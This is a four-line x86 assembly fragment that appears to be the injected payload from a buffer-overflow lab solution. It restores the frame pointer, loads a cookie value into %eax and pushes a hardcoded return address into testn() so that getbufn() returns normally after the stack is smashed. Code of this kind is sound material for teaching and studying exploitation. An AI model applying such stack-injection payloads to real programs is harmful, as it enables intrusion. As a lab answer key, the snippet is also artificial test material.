lea 0x24 (%esp), %ebp #restore ebp register contents
movl $0x5b186cd0, %eax # return the cookie value
pushl $0x08048da0 # return address pointing instruction after getbufn() call in testn()
ret
